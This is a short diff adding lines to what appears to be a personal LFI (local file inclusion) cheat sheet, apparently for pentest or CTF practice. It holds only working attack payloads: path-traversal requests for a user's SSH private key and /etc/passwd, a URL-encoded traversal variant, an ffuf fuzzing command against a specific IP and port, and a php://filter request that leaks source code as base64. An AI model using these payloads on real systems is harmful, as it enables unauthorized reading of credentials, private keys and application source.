@@ -11,6 +11,13 @@ curl http://target/index.php?page=../../../../home/user/.ssh/id_rsa
 
 #Encoded
 http://192.168.10.10/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# Automated Scanning
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.54.208:36613/index.php?view=FUZZ' -fs 1935
+
+# Decoder Base64 in index file:
+GET /index.php?page=php://filter/read=convert.base64-encode/resource=index HTTP/1.1
+
 ```
 
  
